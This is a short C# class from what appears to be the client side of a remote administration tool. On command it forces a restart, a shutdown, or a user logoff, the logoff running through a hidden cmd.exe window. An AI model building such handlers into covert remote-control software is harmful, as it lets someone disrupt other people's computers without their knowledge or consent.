using Client.Helper;
using System.Diagnostics;

namespace Client.PacketHandler
{
    public class HandlerComputerOption
    {
        public void Restart()
        {
            new Powershell().Run("Restart-Computer -Force");
        }

        public void Shutdown()
        {
            new Powershell().Run("Stop-Computer -Force");
        }

        public void Logoff()
        {
            ProcessStartInfo processStart = new ProcessStartInfo()
            {
                Arguments = "/c Shutdown /l /f",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = "cmd.exe"
            };
            Process.Start(processStart);
        }
    }
}
